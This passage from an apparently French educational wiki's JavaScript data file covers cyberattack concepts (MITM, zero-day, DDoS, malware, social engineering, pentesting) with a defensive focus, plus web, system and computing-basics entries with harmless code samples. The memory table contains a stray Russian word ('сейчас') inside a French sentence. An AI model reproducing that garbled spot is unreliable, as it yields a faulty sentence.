{h:"Mécanisme",body:"<p>Sur un réseau non fiable, l'attaquant se fait passer pour la passerelle (<b>ARP spoofing</b>) ou propose un faux Wi-Fi (<b>evil twin</b>). Sans chiffrement vérifié, il lit et modifie tout.</p>"},
{h:"Parades",body:"<ul><li>HTTPS partout + <b>HSTS</b>, certificats valides, alertes sur erreurs cert.</li><li>VPN fiable sur Wi-Fi publics.</li><li>Épinglage de certificat (pinning) pour les apps mobiles sensibles.</li></ul>"}]},

{id:"zero-day",title:"Vulnérabilité Zero-Day",cat:"cyber",tags:["zero-day","exploit","vulnérabilité"],level:3,danger:3,updated:"2026-10-09",read:2,related:["malware","ransomware","pentest"],excerpt:"Une faille inconnue de l'éditeur : zéro jour pour se protéger. L'arme la plus chère du marché noir.",
infobox:{Type:"Faille inconnue",Gravité:"Critique",Marché:"Jusqu'à 7 chiffres",Parade:"Défense en profondeur"},
sections:[
{h:"Cycle de vie",body:"<p>Découverte (chercheur, broker, attaquant) → <b>exploitation silencieuse</b> → divulgation / patch → course au déploiement. La fenêtre entre patch et mise à jour est la plus meurtrière.</p>"},
{h:"Que faire quand on ne peut pas patcher ?",body:"<ul><li>Segmenter, restreindre, journaliser (EDR, WAF en mode blocage).</li><li>Réduire la surface : désactiver les modules non utilisés.</li><li>Patcher en <b>< 48 h</b> dès la sortie du correctif critique.</li></ul>"}]},

{id:"ddos",title:"Attaque DDoS",cat:"cyber",tags:["ddos","réseau","disponibilité"],level:2,danger:2,updated:"2026-10-09",read:2,related:["tcp-ip","dns","ransomware"],excerpt:"Noyer un service sous un tsunami de trafic via un botnet. Pas de vol : juste tout mettre à genoux.",
infobox:{Type:"Saturation",Gravité:"Disponibilité",Volume:"Records > 1 Tbps",Parade:"CDN + scrubbing"},
sections:[
{h:"Mécanisme",body:"<p>Des dizaines de milliers de machines compromises (<b>botnet</b>, souvent IoT) inondent la cible : volumétrique (UDP), protocolaire (SYN flood) ou applicatif (requêtes HTTP lentes et coûteuses).</p>"},
{h:"Parades",body:"<ul><li>CDN / anti-DDoS (absorption + <b>scrubbing</b>), anycast.</li><li>Limitation de débit (rate limiting), cache agressif.</li><li>Plan de crise + contacts opérateur / hébergeur à l'avance.</li></ul>"}]},

{id:"malware",title:"Malware (logiciel malveillant)",cat:"cyber",tags:["malware","virus","trojan"],level:2,danger:3,updated:"2026-10-09",read:2,related:["ransomware","sauvegardes","pentest"],excerpt:"Virus, vers, trojans, spywares : la faune des programmes hostiles, et comment ils s'accrochent à vos machines.",
infobox:{Type:"Programme hostile",Gravité:"Variable → critique",Vecteur:"Pièces jointes · Macros · Cracks"},
sections:[
{h:"Famille",body:"<table class='fiche'><tr><th>Type</th><th>Comportement</th></tr><tr><td>Virus</td><td>S'accroche à un hôte, se réplique à l'exécution</td></tr><tr><td>Ver</td><td>Se propage seul sur le réseau</td></tr><tr><td>Trojan</td><td>Se déguise en logiciel légitime, ouvre un accès</td></tr><tr><td>Spyware / Stealer</td><td>Vole mots de passe, cookies, portefeuilles</td></tr><tr><td>Rootkit</td><td>Se cache au cœur du système</td></tr></table>"},
{h:"Hygiène",body:"<ul><li>Sources officielles uniquement, macros Office désactivées, cracks = infestation quasi garantie.</li><li>Antivirus/EDR à jour, sauvegardes, comptes non-admin au quotidien.</li></ul>"}]},

{id:"social-engineering",title:"Ingénierie sociale",cat:"cyber",tags:["social","manipulation","osint"],level:1,danger:3,updated:"2026-10-09",read:2,related:["phishing","osint","authentification"],excerpt:"Le hack du cerveau : prétexte, urgence, autorité. Une grande partie des intrusions commence par un humain abusé, pas un firewall percé.",
infobox:{Type:"Manipulation humaine",Gravité:"Critique",Leviers:"Urgence · Autorité · Empathie"},
sections:[
{h:"Techniques",body:"<ul><li><b>Prétexting :</b> se faire passer pour le support, un collègue, un livreur.</li><li><b>Appât (baiting) :</b> clé USB piégée, faux recrutement avec test piégé.</li><li><b>Quid pro quo :</b> « je vous aide, donnez-moi juste votre… »</li><li><b>Tailgating :</b> suivre quelqu'un dans une zone sécurisée.</li></ul>"},
{h:"Contre-mesures",body:"<ul><li>Procédures de vérification (rappeler sur numéro officiel).</li><li>Culture du « non poli » : le droit de refuser une demande bizarre.</li><li>Moindre exposition publique (cf. fiche OSINT).</li></ul>"}]},

{id:"cryptographie",title:"Cryptographie",cat:"cyber",tags:["crypto","chiffrement","tls"],level:3,danger:0,updated:"2026-10-09",read:2,related:["ssh","authentification","http"],excerpt:"Chiffrement symétrique, asymétrique, hachage, TLS : les maths qui protègent vos messages et vos mots de passe.",
infobox:{Piliers:"Confidentialité · Intégrité · Authentification","À utiliser":"AES-GCM · ChaCha20 · Argon2","À fuir":"MD5 · SHA1 · DES"},
sections:[
{h:"Les trois outils",body:"<table class='fiche'><tr><th>Outil</th><th>Rôle</th><th>Exemple</th></tr><tr><td>Chiffrement symétrique</td><td>Secret partagé rapide</td><td>AES-GCM</td></tr><tr><td>Chiffrement asymétrique</td><td>Échange sans secret préalable</td><td>RSA, X25519</td></tr><tr><td>Hachage + KDF</td><td>Empreintes, mots de passe</td><td>SHA-256, Argon2, bcrypt</td></tr></table>"},
{h:"Erreurs fatales",body:"<div class='warn'>⚠ Ne créez <b>jamais</b> votre propre algorithme. N'utilisez pas MD5/SHA1 pour la sécurité. Ne chiffrez pas les mots de passe (on les <b>hache</b> avec Argon2/bcrypt + sel). Stockez les clés dans un KMS/HSM, pas dans le code.</div>"}]},

{id:"osint",title:"OSINT",cat:"cyber",tags:["osint","enquête","renseignement"],level:2,danger:1,updated:"2026-10-09",read:2,related:["social-engineering","pentest","phishing"],excerpt:"Renseignement de sources ouvertes : retrouver une personne, une entreprise ou une fuite avec des données publiques.",
infobox:{Type:"Investigation légale",Sources:"Réseaux · DNS · Archives",Cadre:"Légalité stricte (RGPD)"},
sections:[
{h:"Méthode",body:"<ul><li><b>Cartographier :</b> domaines, sous-domaines (crt.sh), DNS, certificats, archives Wayback.</li><li><b>Recouper :</b> pseudos, photos (recherche inversée), métadonnées, fuites (haveibeenpwned).</li><li><b>Vérifier :</b> au moins deux sources indépendantes avant toute conclusion.</li></ul>"},
{h:"Éthique & défense",body:"<p>L'OSINT défensif (auditer <i>sa propre</i> exposition) est précieux ; le harcèlement et l'accès non autorisé sont illégaux. Réduisez votre empreinte : pseudos uniques, métadonnées nettoyées, paramètres de confidentialité.</p>"}]},

{id:"pentest",title:"Test d'intrusion (Pentest)",cat:"cyber",tags:["pentest","audit","redteam"],level:3,danger:0,updated:"2026-10-09",read:2,related:["osint","xss","sql-injection"],excerpt:"Piratage autorisé par contrat : trouver les failles avant les criminels. Méthodo, outils, restitution.",
infobox:{Cadre:"Contrat + périmètre écrit",Phases:"Reco · Exploit · Rapport",Outils:"Burp · Nmap · Metasploit"},
sections:[
{h:"Méthodologie",body:"<ul><li><b>Cadrage :</b> périmètre, interdits, créneaux — sans contrat signé, c'est une infraction.</li><li><b>Reconnaissance :</b> cartographie passive puis active.</li><li><b>Exploitation mesurée</b> + preuve d'impact, sans destruction.</li><li><b>Rapport actionnable :</b> criticité, preuves, remédiation vérifiable.</li></ul>"},
{h:"Boîte à outils",body:"<p>Nmap, Burp Suite, OWASP ZAP, Nuclei, BloodHound (AD), Metasploit. Et surtout : des notes rigoureuses et une éthique irréprochable.</p>"}]},

/* ── WEB ── */
{id:"html-css",title:"HTML & CSS",cat:"web",tags:["html","css","frontend"],level:1,danger:0,updated:"2026-10-09",read:2,excerpt:"Le squelette et la peau du web : sémantique accessible d'un côté, mise en page moderne de l'autre.",
infobox:{Rôle:"Structure (HTML) · Style (CSS)",Standard:"WHATWG · W3C",Base:"Flexbox · Grid"},
sections:[
{h:"L'essentiel",body:"<p><b>HTML</b> décrit le sens (titres, paragraphes, formulaires) ; <b>CSS</b> décrit la présentation. Un HTML sémantique (<code>header</code>, <code>main</code>, <code>nav</code>) = meilleur SEO + accessibilité gratuite.</p>",code:{lang:"html",code:"<main class=\"card\">\n  <h1>Bonjour le web</h1>\n  <p>Un paragraphe <strong>important</strong>.</p>\n  <button>Agir</button>\n</main>\n\n<style>\n.card { max-width: 40rem; margin: auto; padding: 2rem; }\n</style>"}},
{h:"Réflexes modernes",body:"<ul><li>Mobile-first, unités relatives (<code>rem</code>, <code>clamp()</code>).</li><li>Grid pour les pages, Flexbox pour les composants.</li><li>Contrastes vérifiés, focus visibles, images avec <code>alt</code>.</li></ul>"}]},

{id:"react",title:"React",cat:"web",tags:["react","frontend","javascript"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"La bibliothèque qui a réinventé le front : composants, état, rendu déclaratif. Écosystème immense.",
infobox:{Créateur:"Meta (2013)",Modèle:"Composants · Hooks",Enfant:"Next.js"},
sections:[
{h:"Philosophie",body:"<p>On <b>décrit</b> l'UI en fonction de l'état, React réconcilie le DOM. Les <b>hooks</b> (<code>useState</code>, <code>useEffect</code>) portent la logique ; les Server Components (Next.js) déplacent le lourd côté serveur.</p>",code:{lang:"javascript",code:"function Compteur() {\n  const [n, setN] = React.useState(0);\n  return <button onClick={() => setN(n + 1)}>\n    Clics : {n}\n  </button>;\n}"}},
{h:"Pièges",body:"<ul><li>Effets infinis (<code>useEffect</code> sans dépendances).</li><li>État dupliqué entre parent/enfant.</li><li><code>dangerouslySetInnerHTML</code> = porte XSS : à bannir sauf sanitize strict.</li></ul>"}]},

{id:"nodejs",title:"Node.js",cat:"web",tags:["node","backend","javascript"],level:2,danger:1,updated:"2026-10-09",read:2,excerpt:"JavaScript côté serveur, I/O non-bloquantes : APIs rapides, temps réel, tooling. Et une vigilance dépendances.",
infobox:{Moteur:"V8 + libuv",Style:"Événementiel",Usage:"API · Temps réel · CLI"},
sections:[
{h:"Pourquoi Node ?",body:"<p>Un seul langage des deux côtés, <b>npm</b> (l'un des plus grands registres de paquets), et une boucle événementielle redoutable pour les API et le temps réel (WebSocket, streaming).</p>",code:{lang:"javascript",code:"import http from 'node:http';\n\nhttp.createServer((req, res) => {\n  res.writeHead(200, {'Content-Type': 'application/json'});\n  res.end(JSON.stringify({ ok: true }));\n}).listen(3000);"}},
{h:"Sécurité npm",body:"<div class='warn'>⚠ <b>Supply chain :</b> verrouillez (<code>package-lock.json</code>), auditez (<code>npm audit</code>), limitez les scripts d'installation, épinglez les versions en prod.</div>"}]},

{id:"api-rest",title:"API REST",cat:"web",tags:["api","rest","backend"],level:2,danger:1,updated:"2026-10-09",read:2,excerpt:"Le contrat lingua franca du web : ressources, verbes HTTP, statuts. Bien la designer, c'est diviser les bugs par deux.",
infobox:{Style:"Ressources + HTTP",Verbes:"GET POST PUT PATCH DELETE",Format:"JSON + statuts"},
sections:[
{h:"Principes",body:"<ul><li><b>Ressources nommées</b> (<code>/users/42</code>), verbes HTTP pour les actions.</li><li><b>Statuts honnêtes :</b> 200/201, 400, 401, 403, 404, 429, 500 — jamais 200 pour une erreur.</li><li><b>Versionner</b> (<code>/v1</code>), <b>paginer</b>, <b>limiter</b> (rate limit).</li><li>Auth : OAuth2/OIDC, scopes minimaux, tokens courts.</li></ul>"},
{h:"Top failles d'API",body:"<p>Selon l'OWASP API : <b>BOLA</b> (accès à l'objet d'autrui via <code>/orders/1234</code>), auth cassée, exposition massive, rate-limit absent. Testez chaque endpoint <i>en tant qu'un autre utilisateur</i>.</p>"}]},

{id:"graphql",title:"GraphQL",cat:"web",tags:["graphql","api"],level:3,danger:1,updated:"2026-10-09",read:2,excerpt:"Interrogez exactement ce qu'il vous faut en une requête. Puissant et élégant — à condition de le brider.",
infobox:{Créateur:"Meta (2015)",Modèle:"Schéma + résolveurs",Risque:"Requêtes coûteuses"},
sections:[
{h:"Idée",body:"<p>Le client décrit la forme de la réponse ; le serveur résout via un <b>schéma typé</b>. Fini le sur-fetching des REST verbeuses.</p>"},
{h:"Sécuriser",body:"<ul><li>Profondeur et coût limités (query complexity), timeouts.</li><li>Introspection désactivée en prod.</li><li>Autorisation <b>au niveau champ</b>, pas seulement à l'entrée.</li></ul>"}]},

/* ── SYSTÈME ── */
{id:"linux",title:"Linux",cat:"systeme",tags:["linux","terminal","sysadmin"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Le système qui fait tourner le monde : serveurs, cloud, Android, supercalculateurs. Le terminal est sa langue maternelle.",
infobox:{Créateur:"Linus Torvalds (1991)",Famille:"GNU/Linux · Unix-like",Shell:"Bash · Zsh · Fish"},
sections:[
{h:"Prise en main",body:"<p>Fichiers, permissions, processus, paquets : tout est fichier, tout est texte. Une vingtaine de commandes couvre l'essentiel des besoins.</p>",code:{lang:"bash",code:"# Le kit de survie\nls -la            # lister + droits\nchmod 600 secret  # verrouiller un fichier\nps aux | grep node\njournalctl -u nginx --since -1h\nssh user@serveur   # administrer à distance"}},
{h:"Sécurité de base",body:"<ul><li>Compte non-root + <code>sudo</code>, SSH par clés (pas de mot de passe), fail2ban.</li><li>Mises à jour automatiques de sécurité, pare-feu (ufw/nftables) par défaut-deny.</li><li>Sauvegardes testées — un serveur sans backup est une promesse de drame.</li></ul>"}]},

{id:"git",title:"Git",cat:"systeme",tags:["git","devops","collaboration"],level:1,danger:0,updated:"2026-10-09",read:2,excerpt:"Le carnet de bord infalsifiable du code : branches, fusions, historique. Mal utilisé, il fuite des secrets.",
infobox:{Créateur:"Linus Torvalds (2005)",Modèle:"Distribué",Hôtes:"GitHub · GitLab · Forgejo"},
sections:[
{h:"Workflow sain",body:"<p>Branches courtes, commits atomiques et messages clairs, <b>pull requests</b> relues, <code>main</code> toujours déployable. <code>rebase</code> pour une histoire lisible, <code>merge</code> pour garder la vérité.</p>",code:{lang:"bash",code:"git switch -c feat/login\n# ... travail ...\ngit add -p && git commit -m \"feat(auth): vérifie le mot de passe\"\ngit push -u origin feat/login"}},
{h:"Ne jamais commiter",body:"<div class='warn'>⚠ Clés API, mots de passe, fichiers <code>.env</code> : utilisez <code>.gitignore</code> + gestionnaire de secrets (Vault, Doppler). Un secret poussé = <b>révoqué immédiatement</b> (l'historique n'oublie jamais).</div>"}]},

{id:"docker",title:"Docker & Conteneurs",cat:"systeme",tags:["docker","devops","cloud"],level:2,danger:1,updated:"2026-10-09",read:2,excerpt:"« Ça marche sur ma machine » est mort : embarquez app + dépendances dans un conteneur identique partout.",
infobox:{Concept:"Images · Conteneurs · Registries",Fichier:"Dockerfile",Orga:"Compose · Kubernetes"},
sections:[
{h:"Le minimum vital",body:"<p>Une <b>image</b> = un modèle ; un <b>conteneur</b> = une instance isolée. Le <code>Dockerfile</code> décrit la construction, couche par couche.</p>",code:{lang:"dockerfile",code:"FROM node:22-alpine\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\nCOPY . .\nUSER node\nCMD [\"node\", \"server.js\"]"}},
{h:"Sécurité",body:"<ul><li>Images officielles/slimes, scan (<code>docker scout</code>), rebuild régulier.</li><li>Utilisateur non-root, filesystem read-only, secrets via variables/orchestrateur — jamais dans l'image.</li></ul>"}]},

{id:"tcp-ip",title:"TCP/IP",cat:"systeme",tags:["réseau","tcp","ip"],level:3,danger:0,updated:"2026-10-09",read:2,excerpt:"Le langage commun d'Internet : adresses IP, paquets, ports, handshake. Tout le reste est construit dessus.",
infobox:{Couches:"Liaison · Internet · Transport · Appli",Clés:"IP · TCP/UDP · Ports"},
sections:[
{h:"En bref",body:"<p><b>IP</b> achemine les paquets (sans garantie) ; <b>TCP</b> ajoute fiabilité, ordre et contrôle de flux (handshake SYN/SYN-ACK/ACK) ; <b>UDP</b> privilégie la vitesse (streaming, jeux, DNS). Les <b>ports</b> désignent l'application (443 = HTTPS).</p>"},
{h:"Diagnostiquer",body:"<p><code>ping</code>, <code>traceroute</code>, <code>ss -tulpn</code>, <code>curl -v</code>, Wireshark pour voir les octets réels. Bien souvent, les « bugs réseau » viennent du DNS ou du pare-feu.</p>"}]},

{id:"dns",title:"DNS",cat:"systeme",tags:["dns","réseau","web"],level:2,danger:1,updated:"2026-10-09",read:2,excerpt:"L'annuaire d'Internet : transformer les noms en IP. Simple, distribué, et régulièrement attaqué.",
infobox:{Rôle:"Nom → IP",Enregistrements:"A · AAAA · MX · TXT · CNAME",Sécurité:"DNSSEC · DoH"},
sections:[
{h:"Fonctionnement",body:"<p>Résolveur → racine → TLD → autoritaire → réponse <b>cachée</b> (TTL). Quelques millisecondes, des milliards de fois par jour.</p>"},
{h:"Menaces",body:"<ul><li><b>Spoofing / cache poisoning :</b> fausses réponses → faux sites. Parade : DNSSEC, DoH/DoT.</li><li><b>Tunneling :</b> exfiltration via requêtes DNS. Surveillez les volumes.</li><li><b>Hijacking :</b> compte registrar compromis = domaine volé. MFA + verrouillage registre.</li></ul>"}]},

/* ── CONCEPTS ── */
{id:"algorithmes",title:"Algorithmes",cat:"concept",tags:["algo","complexité","logique"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Recettes rigoureuses : trier, chercher, optimiser. La notation Big-O dit si votre code survivra à l'échelle.",
infobox:{Mesure:"Big-O (temps · espace)",Classiques:"Tri · Recherche · Graphes"},
sections:[
{h:"Complexité, l'intuition",body:"<table class='fiche'><tr><th>Notation</th><th>Sens</th><th>Exemple</th></tr><tr><td>O(1)</td><td>Constant</td><td>Accès tableau</td></tr><tr><td>O(log n)</td><td>Diviser pour régner</td><td>Recherche dichotomique</td></tr><tr><td>O(n)</td><td>Linéaire</td><td>Un parcours</td></tr><tr><td>O(n²)</td><td>Quadratique</td><td>Double boucle naïve</td></tr></table><p>Un O(n²) sur 10 000 éléments = 100 millions d'opérations : c'est là que les apps « meurent » en prod.</p>"},
{h:"Panier de base",body:"<ul><li><b>Tri :</b> quicksort / mergesort / timsort (celui de Python).</li><li><b>Graphes :</b> BFS, DFS, Dijkstra.</li><li><b>Recherche :</b> dichotomie, tables de hachage.</li></ul>"}]},

{id:"poo",title:"Programmation orientée objet",cat:"concept",tags:["poo","paradigme","design"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Objets, classes, encapsulation, héritage, polymorphisme : organiser le code comme un monde de choses qui se parlent.",
infobox:{Piliers:"Encapsulation · Héritage · Polymorphisme",Langages:"Java · C# · Python · PHP"},
sections:[
{h:"Les 4 piliers",body:"<ul><li><b>Encapsulation :</b> cacher l'intérieur, exposer une interface.</li><li><b>Héritage :</b> réutiliser et spécialiser (avec modération).</li><li><b>Polymorphisme :</b> même message, comportements adaptés.</li><li><b>Abstraction :</b> ne montrer que l'essentiel.</li></ul>"},
{h:"Le piège",body:"<p>L'héritage profond devient un labyrinthe. Préférez la <b>composition</b> (« a un ») à l'héritage (« est un ») et les petits objets testables (SOLID sans dogme).</p>"}]},

{id:"structures-donnees",title:"Structures de données",cat:"concept",tags:["data","algo","mémoire"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Tableaux, listes, piles, files, arbres, graphes, tables de hachage : choisir la bonne boîte change tout.",
infobox:{Question:"Quel accès ? Quel coût ?",Stars:"Table de hachage · Arbre"},
sections:[
{h:"Guide express",body:"<table class='fiche'><tr><th>Structure</th><th>Fort pour</th></tr><tr><td>Tableau</td><td>Accès indexé O(1)</td></tr><tr><td>Table de hachage</td><td>Clé → valeur O(1) moyen</td></tr><tr><td>Pile / File</td><td>LIFO / FIFO (undo, files d'attente)</td></tr><tr><td>Arbre</td><td>Hiérarchies, recherche ordonnée</td></tr><tr><td>Graphe</td><td>Relations (réseaux, cartes)</td></tr></table>"}]},

/* ── FONDATIONS : le début de l'informatique ── */
{id:"debut-informatique",title:"Début de l'informatique",cat:"concept",tags:["histoire","binaire","fondations","débutant"],level:1,danger:0,updated:"2026-10-09",read:5,excerpt:"D'où viennent les ordinateurs ? Binaire, transistors, portes logiques, mémoire, encodages : toute la fondation, de zéro, sans jargon.",
infobox:{Question:"Comment ça marche, vraiment ?",Prérequis:"Aucun",Programme:"Histoire · Binaire · Logique · CPU"},
sections:[
{h:"D'où vient l'informatique ?",body:"<p>Bien avant les écrans, calculer était un métier : des humains — les « calculateurs » — passaient leurs journées à faire des tables à la main. La mécanisation a pris 300 ans :</p><table class='fiche'><tr><th>Date</th><th>Étape</th></tr><tr><td>1642</td><td><b>Pascaline</b> de Pascal : additionner avec des roues dentées.</td></tr><tr><td>1804</td><td>Métier <b>Jacquard</b> : le motif du tissu est codé sur des <b>cartes perforées</b> — le premier « programme » stocké.</td></tr><tr><td>1837</td><td><b>Babbage</b> imagine la machine analytique ; <b>Ada Lovelace</b> y écrit le premier algorithme : le logiciel naît avant le matériel.</td></tr><tr><td>1936</td><td><b>Turing</b> définit ce qu'est « calculer » avec sa machine théorique — le plan de tous les ordinateurs.</td></tr><tr><td>1937</td><td><b>Shannon</b> montre que l'algèbre de Boole (vrai/faux) se câble en circuits électriques.</td></tr><tr><td>1945</td><td><b>ENIAC</b> : 17 000 lampes, 30 tonnes. Architecture <b>von Neumann</b> : programme stocké en mémoire.</td></tr><tr><td>1947</td><td><b>Transistor</b> (Bell Labs) : petit, fiable, peu gourmand — il remplace les lampes.</td></tr><tr><td>1971</td><td><b>Intel 4004</b> : le premier microprocesseur, 2 300 transistors. Aujourd'hui : des dizaines de milliards.</td></tr></table>"},
{h:"Pourquoi tout est en binaire ?",body:"<p>Un ordinateur ne comprend ni les mots ni le décimal : il ne sait que <b>laisser passer du courant, ou non</b>. Deux états stables valent mieux que dix états fragiles : pas d'approximation, pas d'erreur d'interprétation, et des composants ridiculement simples (un interrupteur).</p><div class='tip'>✔ <b>L'unité de base :</b> le <b>bit</b> (binary digit) = un 0 ou un 1. Huit bits forment un <b>octet</b> (byte) : 256 valeurs possibles (0 à 255).</div>"},
{h:"Compter en binaire",body:"<p>Chaque position vaut une puissance de 2 (…128, 64, 32, 16, 8, 4, 2, 1). Pour lire <code>00001101</code>, additionnez les positions à 1 : 8 + 4 + 1 = <b>13</b>.</p><table class='fiche'><tr><th>Décimal</th><th>Binaire</th><th>Décimal</th><th>Binaire</th></tr><tr><td>0</td><td>0000</td><td>8</td><td>1000</td></tr><tr><td>1</td><td>0001</td><td>9</td><td>1001</td></tr><tr><td>2</td><td>0010</td><td>10</td><td>1010</td></tr><tr><td>3</td><td>0011</td><td>11</td><td>1011</td></tr><tr><td>4</td><td>0100</td><td>12</td><td>1100</td></tr><tr><td>5</td><td>0101</td><td>13</td><td>1101</td></tr><tr><td>6</td><td>0110</td><td>14</td><td>1110</td></tr><tr><td>7</td><td>0111</td><td>15</td><td>1111</td></tr></table>",code:{lang:"python",code:"def vers_binaire(n):\n    return bin(n)[2:].zfill(8)  # 8 bits, zéros à gauche\n\nprint(vers_binaire(13))   # 00001101\nprint(vers_binaire(42))   # 00101010  (32+8+2)\nprint(int('1101', 2))     # 13 — et le retour"}},
{h:"Bits, octets et ordres de grandeur",body:"<table class='fiche'><tr><th>Unité</th><th>Vaut</th><th>Ordre d'idée</th></tr><tr><td>1 octet</td><td>8 bits</td><td>Une lettre</td></tr><tr><td>1 ko</td><td>1 024 octets</td><td>Un long texte</td></tr><tr><td>1 Mo</td><td>1 024 ko</td><td>Une photo</td></tr><tr><td>1 Go</td><td>1 024 Mo</td><td>Un film compressé</td></tr><tr><td>1 To</td><td>1 024 Go</td><td>Un disque familial</td></tr></table><div class='warn'>⚠ <b>Le piège classique :</b> les débits internet sont en <b>bits</b> (100 Mb/s) mais les fichiers en <b>octets</b>. 100 Mb/s ≈ 12,5 Mo/s : divisez par 8 pour estimer un téléchargement.</div>"},
{h:"L'hexadécimal, le raccourci des pros",body:"<p>Écrire <code>11011111</code> est illisible : on regroupe par 4 bits, et chaque groupe devient <b>un seul caractère</b> en base 16 (0-9 puis A=10 … F=15). <code>1101 1111</code> → <code>DF</code>.</p><ul><li><b>Couleurs web :</b> <code>#FF4D00</code> = rouge 255, vert 77, bleu 0 (l'orange de ce site).</li><li><b>Mémoire & erreurs :</b> adresses comme <code>0x7FF3A2</code>, codes d'erreur, clés.</li><li><b>Règle :</b> 1 chiffre hexa = 4 bits, 1 octet = 2 chiffres hexa.</li></ul>"},
{h:"La logique de Boole et les portes",body:"<p>George Boole (1854) a algébrisé le vrai et le faux. Trois opérations suffisent à tout calculer :</p><table class='fiche'><tr><th>Porte</th><th>Règle</th><th>Exemple</th></tr><tr><td><b>AND (ET)</b></td><td>1 si les deux entrées valent 1</td><td>1 AND 0 = 0</td></tr><tr><td><b>OR (OU)</b></td><td>1 si au moins une entrée vaut 1</td><td>1 OR 0 = 1</td></tr><tr><td><b>NOT (NON)</b></td><td>Inverse l'entrée</td><td>NOT 1 = 0</td></tr><tr><td><b>XOR</b></td><td>1 si les entrées diffèrent</td><td>1 XOR 1 = 0</td></tr></table><p>Le miracle : avec XOR (la somme) + AND (la retenue), on additionne. Enchaînez ces <b>demi-additionneurs</b> et vous obtenez une calculatrice complète — puis un processeur.</p>"},
{h:"Du transistor au processeur",body:"<p>Un <b>transistor</b> est un interrupteur commandé électriquement, de quelques nanomètres. Des milliards de transistors forment des portes logiques, qui forment les blocs du <b>CPU</b> :</p><ul><li><b>ALU :</b> calcule (additions, comparaisons).</li><li><b>Unité de contrôle :</b> orchestre, lit les instructions.</li><li><b>Registres :</b> poignées de cases ultra-rapides pour le travail en cours.</li></ul><p>Le CPU répète <b>fetch → decode → execute</b> (lire, comprendre, agir) à chaque battement d'<b>horloge</b> : 3 GHz = 3 milliards de cycles par seconde.</p>"},
{h:"La mémoire, une pyramide",body:"<p>Plus c'est proche du CPU, plus c'est rapide — et petit :</p><table class='fiche'><tr><th>Niveau</th><th>Rôle</th></tr><tr><td>Registres / Cache</td><td>Le plan de travail (ko-Mo, quasi instantané)</td></tr><tr><td>RAM</td><td>Le bureau (Go, ce qui tourne сейчас)</td></tr><tr><td>SSD / Disque</td><td>L'armoire (To, ce qui attend)</td></tr></table><div class='tip'>✔ Éteindre = vider le bureau : la RAM s'efface, le disque garde. D'où l'intérêt des sauvegardes.</div>"},
{h:"Comment le texte devient des nombres",body:"<p>La table <b>ASCII</b> (1963) numérote 128 caractères : A = 65, a = 97, 0 = 48, espace = 32. « Hi » = <code>72 105</code>. <b>Unicode / UTF-8</b> a généralisé à toutes les langues et aux émojis (1 à 4 octets par symbole, compatible ASCII).</p>",code:{lang:"python",code:"print(ord('A'), chr(65))          # 65 A\nprint('Hi'.encode('utf-8'))       # b'Hi' → 72 105\nprint('é'.encode('utf-8'))        # b'\\xc3\\xa9' → 2 octets\nprint(len('🎉'.encode('utf-8')))  # 4 octets"}},
{h:"Et les images, le son, les programmes ?",body:"<ul><li><b>Image :</b> une grille de pixels, chacun 3 octets (rouge, vert, bleu de 0 à 255).</li><li><b>Son :</b> la hauteur de l'onde mesurée 44 100 fois par seconde (échantillonnage).</li><li><b>Programme :</b> du texte source traduit en instructions binaires (compilé : C, Rust — ou interprété : Python), chargé en RAM, exécuté par le CPU.</li></ul>"},
{h:"À vous : 4 mini-exercices",body:"<ul><li>1. Écrivez <b>13</b> en binaire sur 8 bits. → <code>00001101</code></li><li>2. Que vaut <code>10110</code> en décimal ? → 16 + 4 + 2 = <b>22</b></li><li>3. Que vaut <code>FF</code> en hexadécimal ? → <b>255</b></li><li>4. Quelle porte vaut 1 quand ses entrées diffèrent ? → <b>XOR</b></li></ul><div class='tip'>✔ Tout juste ? Lisez ensuite <b>Le binaire</b>, <b>Portes logiques</b>, <b>Hexadécimal</b> et <b>ASCII & Unicode</b> pour creuser chaque fondation.</div>"}]},

{id:"binaire",title:"Le binaire",cat:"concept",tags:["binaire","bits","fondations"],level:1,danger:0,updated:"2026-10-09",read:2,excerpt:"Compter avec des 0 et des 1 : conversions, additions binaires et ordres de grandeur. Le point de départ.",parent:"debut-informatique",
infobox:{Base:"2 (0 et 1)",Unité:"bit · octet",Repère:"1 octet = 256 valeurs"},
sections:[
{h:"Lire et écrire",body:"<p>Poids des positions : 128-64-32-16-8-4-2-1. <code>00101010</code> = 32 + 8 + 2 = <b>42</b>. Pour convertir un décimal, soustrayez la plus grande puissance de 2 possible, et recommencez.</p>",code:{lang:"python",code:"print(bin(42))        # 0b101010\nprint(int('101010', 2))  # 42"}},
{h:"Additionner en binaire",body:"<p>Mêmes règles qu'en décimal, avec retenue dès 2 : 1 + 1 = 10 (0, retenue 1). Exemple : 5 + 3 → <code>0101 + 0011 = 1000</code> = 8.</p>"},
{h:"Préfixes et puces",body:"<ul><li><code>0b1010</code> : littéral binaire (code).</li><li><code>>> 1</code> : décaler d'un bit à droite = diviser par 2.</li><li>Masques : <code>x & 0xFF</code> garde l'octet bas.</li></ul>"}]},

{id:"portes-logiques",title:"Portes logiques",cat:"concept",tags:["logique","boole","circuits"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"AND, OR, NOT, XOR : les interrupteurs logiques qui additionnent, comparent et décident. Avec tables de vérité.",parent:"debut-informatique",
infobox:{Inventeur:"G. Boole (1854)",Briques:"Transistors",But:"Calculer avec du vrai/faux"},
sections:[
{h:"Tables de vérité",body:"<table class='fiche'><tr><th>A</th><th>B</th><th>AND</th><th>OR</th><th>XOR</th></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td></tr></table>"},
{h:"Le demi-additionneur",body:"<p>Somme S = A <b>XOR</b> B, retenue C = A <b>AND</b> B. Deux portes = un additionneur 1 bit ; enchaînez-en 32 et vous additionnez des entiers 32 bits.</p>",code:{lang:"javascript",code:"const xor = (a,b) => (a||b) && !(a&&b) ? 1 : 0;\nconst halfAdd = (a,b) => ({ s: xor(a,b), c: a&&b ? 1 : 0 });\nconsole.log(halfAdd(1,1)); // { s: 0, c: 1 } → 1+1 = 10b"}},
